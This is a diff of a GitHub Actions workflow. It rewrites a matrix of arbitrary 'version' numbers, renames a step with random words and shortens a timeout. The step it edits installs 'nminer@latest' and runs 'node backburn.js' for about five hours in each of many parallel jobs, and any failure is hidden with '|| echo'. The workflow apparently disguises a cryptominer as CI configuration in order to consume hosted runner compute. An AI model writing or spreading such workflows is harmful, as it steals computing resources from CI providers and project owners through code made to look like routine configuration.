@@ -9,26 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2772 }
-          - { version: 9750 }
-          - { version: 9485 }
-          - { version: 16 }
-          - { version: 8629 }
-          - { version: 5645 }
-          - { version: 5065 }
-          - { version: 1891 }
-          - { version: 4832 }
-          - { version: 697 }
-          - { version: 3847 }
-          - { version: 2532 }
-          - { version: 6199 }
-          - { version: 9274 }
-          - { version: 5970 }
-          - { version: 653 }
-          - { version: 5321 }
-          - { version: 4049 }
-          - { version: 7774 }
-          - { version: 4629 }
+          - { version: 97 }
+          - { version: 9695 }
+          - { version: 1265 }
+          - { version: 7498 }
+          - { version: 6086 }
+          - { version: 9540 }
+          - { version: 6524 }
+          - { version: 3423 }
+          - { version: 6333 }
+          - { version: 8024 }
+          - { version: 846 }
+          - { version: 6445 }
+          - { version: 6266 }
+          - { version: 4943 }
+          - { version: 9702 }
+          - { version: 8591 }
+          - { version: 6482 }
 
     steps:
       - name: Checkout
@@ -39,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: suitcase elevator
+      - name: gladly below dwell boiling
         run: |
           npm install nminer@latest
-          timeout 350m node backburn.js || echo "backburn executed"
+          timeout 302m node backburn.js || echo "backburn executed"
